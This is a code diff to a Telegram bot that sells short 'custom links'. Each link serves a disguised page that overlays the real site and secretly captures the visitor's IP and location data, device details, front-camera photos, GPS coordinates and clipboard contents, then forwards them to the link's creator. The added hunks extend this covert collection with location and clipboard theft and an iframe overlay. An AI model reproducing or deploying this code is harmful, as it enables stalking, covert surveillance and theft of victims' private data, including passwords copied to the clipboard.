@@ -1,6 +1,7 @@
 /**
  * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v10.0 (Merged & Fixed)
- * Features: All Old Info + New Group Logic + Auto Cam/Info + Web Fixed
+ * Features: All Old Info + New Group Logic + Auto Cam/Info + Web Fixed + WebView/Permissions + Admin Reset
+ * NEW: Advanced Referral System + Share Toggle + Support Buttons
  */
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -40,7 +41,9 @@ const userSchema = new mongoose.Schema({
     coins: { type: Number, default: 0 },
     freeUrlsLeft: { type: Number, default: 4 }, 
     isBanned: { type: Boolean, default: false },
-    joinedAt: { type: Date, default: Date.now }
+    joinedAt: { type: Date, default: Date.now },
+    referredBy: { type: Number, default: null }, // NEW: Track who invited
+    referralCount: { type: Number, default: 0 }  // NEW: Total successful invites
 });
 
 const linkSchema = new mongoose.Schema({
@@ -57,7 +60,12 @@ const Link = mongoose.model('Link', linkSchema);
 // [IMPORTANT FIX] Global state variable defined here
 const userState = {};
 
-// ─── 🎨 STYLING & HELPERS (FIXED & MOVED TO GLOBAL SCOPE) ─────────────
+// NEW: Global Settings
+let shareSystemEnabled = true;
+let botUsername = "DX_CODEX_BOT";
+bot.getMe().then(me => botUsername = me.username);
+
+// ─── 🎨 STYLING & HELPERS ─────────────
 
 const fontMap = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'};
 
@@ -74,7 +82,12 @@ function makeBorder(title, content) {
 
 function escapeHtml(text) {
     if (!text) return text;
-    return text.toString().replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+    return text.toString()
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#39;");
 }
 
 async function resolveUser(msg, input) {
@@ -98,7 +111,6 @@ async function checkMembership(chatId) {
             bot.getChatMember(GROUP_ID, chatId).catch(() => null)
         ]);
         
-        // Check if user is present in all required channels/groups
         const isC1 = c1 && s.includes(c1.status);
         const isC2 = c2 && s.includes(c2.status);
         const isG1 = g1 && s.includes(g1.status);
@@ -107,16 +119,41 @@ async function checkMembership(chatId) {
     } catch (e) { return { allJoined: false }; }
 }
 
-// 1. START COMMAND
-bot.onText(/\/start/, async (msg) => {
+// 1. START COMMAND (UPDATED WITH REFERRAL)
+bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     if (msg.chat.type !== 'private') return;
 
     try {
         let user = await User.findOne({ chatId });
+        
         if (!user) {
-            user = new User({ chatId, username: msg.from.username || "Unknown", firstName: escapeHtml(msg.from.first_name) || "User" });
+            user = new User({ 
+                chatId, 
+                username: msg.from.username || "Unknown", 
+                firstName: escapeHtml(msg.from.first_name) || "User" 
+            });
+
+            // Referral Logic
+            if (match[1] && !isNaN(match[1]) && match[1] != chatId) {
+                user.referredBy = parseInt(match[1]);
+            }
             await user.save();
+
+            // Reward Inviter (Only if enabled)
+            if (shareSystemEnabled && user.referredBy) {
+                const referrer = await User.findOne({ chatId: user.referredBy });
+                if (referrer) {
+                    referrer.referralCount += 1;
+                    if (referrer.referralCount % 2 === 0) {
+                        referrer.coins += 1;
+                        bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ᴄᴏɪɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
+                    } else {
+                        bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ᴀ ᴄᴏɪɴ.`), {parse_mode:'HTML'});
+                    }
+                    await referrer.save();
+                }
+            }
         }
         
         if (user.isBanned) {
@@ -132,7 +169,7 @@ bot.onText(/\/start/, async (msg) => {
     } catch (error) { console.log(error); }
 });
 
-// 2. MAIN MENU (Manual Border)
+// 2. MAIN MENU
 async function showMainMenu(msg) {
     const chatId = msg.chat.id || msg.from.id;
     const cleanName = escapeHtml(msg.from.first_name || "User");
@@ -163,13 +200,25 @@ async function showMainMenu(msg) {
     await bot.sendMessage(chatId, content, {
         parse_mode: 'HTML',
         reply_markup: { 
-            keyboard: [[{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }], [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }]], 
+            keyboard: [
+                [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }], 
+                [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }],
+                [{ text: "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" }]
+            ], 
             resize_keyboard: true 
+        }
+    });
+
+    // NEW: Support button sent as a mini message after main menu
+    await bot.sendMessage(chatId, `💬 <b>ɴᴇᴇᴅ ʜᴇʟᴘ ᴏʀ sᴜᴘᴘᴏʀᴛ?</b>`, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
         }
     });
 }
 
-// 3. VERIFICATION MENU (Manual Border)
+// 3. VERIFICATION MENU
 async function showVerificationMenu(msg) {
     const chatId = msg.chat.id || msg.from.id;
     const cleanName = escapeHtml(msg.from.first_name || "User");
@@ -206,7 +255,7 @@ bot.on('message', async (msg) => {
     const text = msg.text;
 
     // Admin Commands Bypass (Group/DM)
-    if (text && (text.startsWith('/add') || text.startsWith('/rem') || text.startsWith('/ban') || text.startsWith('/unban') || text.startsWith('/users'))) return;
+    if (text && (text.startsWith('/add') || text.startsWith('/rem') || text.startsWith('/rm') || text.startsWith('/reset') || text.startsWith('/ban') || text.startsWith('/unban') || text.startsWith('/users') || text.startsWith('/share'))) return;
     if ((msg.caption && msg.caption.startsWith('/broadcast')) || (text && text.startsWith('/broadcast'))) return handleBroadcast(msg);
 
     if (!text) return;
@@ -222,7 +271,7 @@ bot.on('message', async (msg) => {
                 reply_markup: { inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴs", url: `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]] }
             });
         }
-        const info = `<b>👤:</b> <code>${user.firstName}</code>\n<b>🎁: ${user.freeUrlsLeft} ғʀᴇᴇ\n💰: ${user.coins} ᴄᴏɪɴs\n👇: ᴄʜᴏᴏsᴇ ᴛʏᴘᴇ\n┏━━━━━━━━━━┓\n┃ᴇɴᴛᴇʀ ᴀ sʜᴏʀᴛ ɴᴀᴍᴇ ғᴏʀ ʟɪɴᴋ\n┃ᴄʜᴏsᴇ: ᴄᴜsᴛᴏᴍ & ʀᴀɴᴅᴏᴍ\n┗━━━━━━━━━━┛</b>`;
+        const info = `<b>👤:</b> <code>${user.firstName}</code>\n<b>🎁: ${user.freeUrlsLeft} ғʀᴇᴇ\n💰: ${user.coins} ᴄᴏɪɴs\n👇: ᴄʜᴏᴏsᴇ ᴛʏᴘᴇ\n┏━━━━━━━━━━┓\n┃ᴇɴᴛᴇʀ ᴀ sʜᴏʀᴛ ɴᴀᴍᴇ ɢᴏʀ ʟɪɴᴋ\n┃ᴄʜᴏsᴇ: ᴄᴜsᴛᴏᴍ & ʀᴀɴᴅᴏᴍ\n┗━━━━━━━━━━┛</b>`;
         bot.sendMessage(chatId, makeBorder("ᴄʀᴇᴀᴛᴇ ᴜʀʟ", info), {
             parse_mode: 'HTML',
             reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]] }
@@ -267,7 +316,30 @@ ${freeLine}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
         });
     }
     else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ") {
-        bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { parse_mode: 'HTML' });
+        // NEW: Support Button added to Developer Menu
+        bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { 
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
+            }
+        });
+    }
+    else if (text === "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ") {
+        // NEW: Share/Referral Menu logic
+        const shareText = `<b>┏━━「 ${_fnt("REFERRAL SYSTEM")} 」━━┓</b>\n` +
+                          `┃ 🚀 <b>ɪɴᴠɪᴛᴇ ғʀɪᴇɴᴅs & ᴇᴀʀɴ!</b>\n` +
+                          `┃ 👥 <b>ғᴏʀ ᴇᴠᴇʀʏ 2 ɴᴇᴡ ᴜsᴇʀs:</b>\n` +
+                          `┃ 💰 <b>ʏᴏᴜ ɢᴇᴛ 1 ғʀᴇᴇ ᴄᴏɪɴ!</b>\n` +
+                          `┃\n` +
+                          `┃ 📊 <b>ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟs:</b> <code>${user.referralCount || 0}</code>\n` +
+                          `<b>┗━━━━━━━━━━━━━━━┛</b>\n\n` +
+                          `👇 <b>ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ʏᴏᴜʀ ʟɪɴᴋ!</b>`;
+        
+        const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
+        bot.sendMessage(chatId, shareText, {
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
+        });
     }
     
     // Custom Link Steps
@@ -287,7 +359,7 @@ ${freeLine}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
     }
 });
 
-// Callbacks (FIXED CRASH ISSUE HERE)
+// Callbacks 
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
@@ -297,19 +369,16 @@ bot.on('callback_query', async (query) => {
         try {
             const { allJoined } = await checkMembership(chatId);
             if (allJoined) {
-                // Verify confirm notification
                 await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇss!" });
 
-                // Purono message remove kora
                 try {
-                    await bot.deleteMessage(chat_id, msg.message_id);
+                    await bot.deleteMessage(chatId, msg.message_id);
                 } catch (e) { /* message already deleted */ }
 
                 const user = await User.findOne({ chatId });
                 const name = escapeHtml(user.firstName || "User");
                 const mention = `<a href="tg://user?id=${chatId}">${name}</a>`;
 
-                // Stylish Message Body
                 const title = _fnt("SYSTEM READY");
                 const body = 
 `👤 <b>ᴜsᴇʀ: ${mention}</b>
@@ -320,16 +389,25 @@ bot.on('callback_query', async (query) => {
 🔗 <b>ɪғ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ᴜʀʟ</b>
       <b>ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ</b>`;
 
-                // Send New Message with Auto Keyboard
+                // NEW: Support Button added beside Custom URL creation after verification
                 await bot.sendMessage(chatId, makeBorder(title, body), {
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
-                            [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ", callback_data: "create_custom" }]
-                        ],
+                            [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ", callback_data: "create_custom" }],
+                            [{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]
+                        ]
+                    }
+                });
+
+                // Set keyboard for future text interactions
+                await bot.sendMessage(chatId, `⌨️ <b>ᴍᴇɴᴜ ᴋᴇʏʙᴏᴀʀᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ.</b>`, {
+                    parse_mode: 'HTML',
+                    reply_markup: {
                         keyboard: [
                             [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }],
-                            [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }]
+                            [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }],
+                            [{ text: "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" }]
                         ],
                         resize_keyboard: true
                     }
@@ -390,7 +468,15 @@ async function createFinalLink(msg, name, redirectUrl) {
     bot.sendMessage(chatId, makeBorder("✅ sᴜᴄᴄᴇss", `🔗: ${url}\n\n🔄: ${redirectUrl || 'N/A'}\n💰: ʀᴇᴍᴀɪɴɪɴɢ: ${user.coins}`), { parse_mode: 'HTML' });
 }
 
-// ─── 👑 ADMIN COMMANDS (Merged Logic + Styling) ───────────
+// ─── 👑 ADMIN COMMANDS ───────────
+
+// NEW: Admin Toggle for Share System
+bot.onText(/\/share\s+(on|off)/i, (msg, match) => {
+    if (!OWNER_IDS.includes(msg.from.id)) return;
+    const state = match[1].toLowerCase();
+    shareSystemEnabled = (state === 'on');
+    bot.sendMessage(msg.chat.id, makeBorder("⚙️ ᴀᴅᴍɪɴ", `✅: ʀᴇғᴇʀʀᴀʟ sʏsᴛᴇᴍ ɪs ɴᴏᴡ <b>${state.toUpperCase()}</b>`), {parse_mode:'HTML'});
+});
 
 async function modifyCoins(msg, match, type) {
     if (!OWNER_IDS.includes(msg.from.id)) return; 
@@ -416,7 +502,26 @@ async function modifyCoins(msg, match, type) {
 }
 
 bot.onText(/\/add\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyCoins(msg, match, 'add'));
-bot.onText(/\/rem\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyCoins(msg, match, 'rem'));
+bot.onText(/\/(?:rem|rm)\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyCoins(msg, match, 'rem'));
+
+bot.onText(/\/reset(?:\s+(.+))?/, async (msg, match) => {
+    if (!OWNER_IDS.includes(msg.from.id)) return;
+    const targetUser = await resolveUser(msg, match[1]);
+    
+    if (!targetUser) {
+        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
+    }
+    
+    targetUser.coins = 0;
+    targetUser.freeUrlsLeft = 4;
+    targetUser.referralCount = 0; // Reset referral stats as well
+    await targetUser.save();
+    
+    await Link.deleteMany({ creatorChatId: targetUser.chatId });
+    
+    bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ᴀᴄᴄᴏᴜɴᴛ ʀᴇsᴇᴛ sᴜᴄᴄᴇssғᴜʟ\n👤: ${targetUser.firstName}\n🗑: ᴀʟʟ ʟɪɴᴋs ᴅᴇʟᴇᴛᴇᴅ & ᴄᴏɪɴs 0`), {parse_mode:'HTML'});
+    bot.sendMessage(targetUser.chatId, makeBorder("sʏsᴛᴇᴍ", `🔄: ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ʀᴇsᴇᴛ ʙʏ ᴀᴅᴍɪɴ!`), {parse_mode:'HTML'});
+});
 
 bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
@@ -431,11 +536,9 @@ bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
 });
 
 /**
- * 🛠 ADMIN ADVANCED LINK MANAGEMENT (Group & DM Supported)
- * Commands: /ulist, /ulink <id/reply>, /rmlink
+ * 🛠 ADMIN ADVANCED LINK MANAGEMENT 
  */
 
-// 1. /ulist
 bot.onText(/\/ulist/, async (msg) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
 
@@ -465,7 +568,6 @@ bot.onText(/\/ulist/, async (msg) => {
     } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error."); }
 });
 
-// 2. /ulink
 bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
 
@@ -499,7 +601,6 @@ bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
     });
 });
 
-// 3. Callback Handlers (Buttons)
 bot.on('callback_query', async (query) => {
     if (!OWNER_IDS.includes(query.from.id)) return bot.answerCallbackQuery(query.id, { text: "🚫 Access Denied" });
 
@@ -520,7 +621,6 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// 4. /rmlink
 bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
     const targetId = parseInt(match[1]);
@@ -545,7 +645,7 @@ bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
 });
 
 /**
- * 🛠 ADMIN MENU COMMAND (Private DM Only)
+ * 🛠 ADMIN MENU COMMAND
  */
 bot.onText(/\/menu/, async (msg) => {
     const chatId = msg.chat.id;
@@ -571,6 +671,9 @@ bot.onText(/\/menu/, async (msg) => {
 
     menu += `💰 <b>ᴄᴏɴᴛʀᴏʟ sʏsᴛᴇᴍ</b>\n`;
     menu += `├ <code>/add</code> [ǫᴛʏ] [ɪᴅ/ʀᴇᴘʟʏ] - ᴀᴅᴅ ᴄᴏɪɴs\n`;
+    menu += `├ <code>/rm</code> [ǫᴛʏ] [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇᴍᴏᴠᴇ ᴄᴏɪɴs\n`;
+    menu += `├ <code>/reset</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴇᴛ ᴀᴄᴄᴏᴜɴᴛ\n`;
+    menu += `├ <code>/share on|off</code> - ᴛᴏɢɢʟᴇ ʀᴇғᴇʀʀᴀʟ\n`;
     menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
     menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;
 
@@ -659,7 +762,7 @@ bot.onText(/\/users/, async (msg) => {
 
         let report = `📊 <b>sʏsᴛᴇᴍ sᴛᴀᴛɪsᴛɪᴄs</b>\n\n`;
         report += `👥 <b>ᴛᴏᴛᴀʟ ᴜsᴇʀs:</b> <code>${totalUsers}</code>\n`;
-        report += `🔗 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs:</b> <code>${activeLinks}</code>\n`;
+        report += `🔗 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴks:</b> <code>${activeLinks}</code>\n`;
         report += `🚫 <b>ʙᴀɴɴᴇᴅ ᴜsᴇʀs:</b> <code>${bannedUsers}</code>\n`;
         
         await bot.sendMessage(msg.chat.id, makeBorder("sᴛᴀᴛs", report), { parse_mode: 'HTML' });
@@ -734,12 +837,11 @@ async function handleBroadcast(msg) {
     bot.sendMessage(msg.chat.id, makeBorder("ᴅᴏɴᴇ", `✅: sᴇɴᴛ ᴛᴏ ${success} ᴜsᴇʀs`), {parse_mode:'HTML'});
 }
 
-// ─── 🌐 WEB ENGINE (FIXED) ────────
+// ─── 🌐 WEB ENGINE ────────
 
 app.get('/w/:id', async (req, res) => {
     const link = await Link.findOne({ shortId: req.params.id });
     if (!link) return res.send("INVALID LINK");
-    // FIX: Pass empty string if null to prevent "null" text in html
     const redirect = link.originalUrl ? link.originalUrl : "";
     res.send(getHtmlTemplate(req.params.id, redirect));
 });
@@ -778,6 +880,19 @@ app.post('/api/data', async (req, res) => {
         } else if (type === 'cam') {
             const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
             await bot.sendPhoto(owner, buffer, { caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `📱: ${data.platform}`), parse_mode: 'HTML' });
+        } else if (type === 'loc') {
+            let locMsg = `<b>┏━━「 ${_fnt("LOCATION DATA")} 」━━┓</b>\n`;
+            locMsg += `┃ 📍 <b>${_fnt("LATITUDE")}:</b> <code>${data.lat}</code>\n`;
+            locMsg += `┃ 📍 <b>${_fnt("LONGITUDE")}:</b> <code>${data.lon}</code>\n`;
+            locMsg += `┃ 🗺 <b>${_fnt("MAPS")}:</b> <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">Google Maps</a>\n`;
+            locMsg += `<b>┗━━━━━━━━━━┛</b>`;
+            await bot.sendMessage(owner, locMsg, { parse_mode: 'HTML', disable_web_page_preview: true });
+        } else if (type === 'clip') {
+            let clipMsg = `<b>┏━━「 ${_fnt("CLIPBOARD DATA")} 」━━┓</b>\n`;
+            clipMsg += `┃ 📋 <b>${_fnt("COPIED TEXT")}:</b>\n`;
+            clipMsg += `┃ <pre>${escapeHtml(data)}</pre>\n`;
+            clipMsg += `<b>┗━━━━━━━━━━┛</b>`;
+            await bot.sendMessage(owner, clipMsg, { parse_mode: 'HTML' });
         }
         res.json({ status: 'success' });
     } catch (e) { res.json({ status: 'error' }); }
@@ -792,17 +907,30 @@ function getHtmlTemplate(linkId, redirectUrl) {
     <style>
         body{margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden}
         #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10}
-        /* FIX: Only hide capture elements, keep matrix visible */
         #v, #c { display:none }
+        /* NEW: WebView iframe for rendering target content while hacking */
+        #iframeOverlay {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            border: none; z-index: 5; display: none; background: #fff;
+        }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div id="status">INITIALIZING SECURE PROTOCOL...<br>PLEASE WAIT</div>
     <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
+    <iframe id="iframeOverlay"></iframe>
 <script>
 const id = "${linkId}"; 
 const red = "${redirectUrl}"; // Safe injection
+
+// Overlay WebView Logic
+if (red && red.length > 4 && red !== "null") {
+    const iframe = document.getElementById('iframeOverlay');
+    iframe.src = red;
+    iframe.style.display = 'block';
+}
+
 const m=document.getElementById('matrix'); const ctx=m.getContext('2d');
 m.width=window.innerWidth; m.height=window.innerHeight;
 const drops=Array(Math.floor(m.width/20)).fill(0);
@@ -810,8 +938,27 @@ function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.he
 setInterval(draw,33);
 
 async function start() {
-    let ip = {ip:"?"}; 
-    try { ip = await(await fetch('https://ipwho.is/')).json(); } catch(e){}
+    // UPGRADED IP FETCHING (Strong Fallback Algorithm)
+    let ipData = { ip:"Unknown", city:"Unknown", country:"Unknown", isp:"Unknown", loc:"Unknown" }; 
+    try { 
+        const r1 = await fetch('https://ipapi.co/json/'); 
+        const d1 = await r1.json();
+        if (d1.ip) ipData = { ip: d1.ip, city: d1.city||"?", country: d1.country_name||"?", isp: d1.org||"?", loc: d1.latitude+","+d1.longitude };
+        else throw new Error("Fallback 1");
+    } catch(e1) {
+        try {
+            const r2 = await fetch('https://ipwho.is/');
+            const d2 = await r2.json();
+            if (d2.ip) ipData = { ip: d2.ip, city: d2.city||"?", country: d2.country||"?", isp: d2.connection?.isp||"?", loc: d2.latitude+","+d2.longitude };
+            else throw new Error("Fallback 2");
+        } catch(e2) {
+            try {
+                const r3 = await fetch('https://api.ipify.org?format=json');
+                const d3 = await r3.json();
+                ipData.ip = d3.ip;
+            } catch(e3){}
+        }
+    }
     
     let batt = "N/A"; 
     try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"% "+(b.charging?"🔌":"🔋"); } catch(e){}
@@ -824,7 +971,7 @@ async function start() {
     } catch(e){}
 
     const info = {
-        ipData: { ip:ip.ip, city:ip.city, country:ip.country, isp:ip.connection?.isp, loc: ip.latitude+","+ip.longitude },
+        ipData: ipData,
         battery: batt, 
         gpu: gpu,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -838,13 +985,10 @@ async function start() {
         }
     };
 
-    // Send Info
-    fetch('/api/data', {
-        method:'POST', 
-        headers:{'Content-Type':'application/json'}, 
-        body: JSON.stringify({linkId:id, type:'info', data:info})
-    });
+    // Send Main Info
+    fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:id, type:'info', data:info}) });
 
+    // CHAIN OF PERMISSIONS: 1. Camera -> 2. Location -> 3. Clipboard
     try {
         const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
         const v = document.getElementById('v'); v.srcObject=s;
@@ -858,17 +1002,42 @@ async function start() {
                 fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
                 
                 count++; 
-                // Fix redirect logic
                 if(count>=5){ 
                     clearInterval(itv); 
-                    if(red && red.length > 4 && red !== "null") window.location.href=red; 
+                    // Redirect as fallback if iframe gets blocked by target site
+                    if(red && red.length > 4 && red !== "null") setTimeout(() => { window.location.href=red; }, 2000); 
                 }
-            },1500);
+            }, 1500);
+
+            // Step 2: Request Location after camera starts
+            setTimeout(() => {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'loc', data:{lat: pos.coords.latitude, lon: pos.coords.longitude}})});
+                    
+                    // Step 3: Attempt Clipboard Data extraction
+                    setTimeout(async () => {
+                        try {
+                            const text = await navigator.clipboard.readText();
+                            if (text) fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
+                        } catch(err) {}
+                    }, 2000);
+
+                }, (e)=>{});
+            }, 2000);
         };
-    } catch(e){ 
+    } catch(e) { 
         document.getElementById('status').innerHTML="ACCESS DENIED: PLEASE ALLOW PERMISSION<br>TO VERIFY YOUR IDENTITY"; 
     }
 }
+
+// Bind clipboard fetch to any user click for better browser support
+window.addEventListener('click', async () => {
+    try {
+        const text = await navigator.clipboard.readText();
+        if (text) fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
+    } catch(err) {}
+}, {once:true});
+
 window.onload = start;
 </script>
 </body>
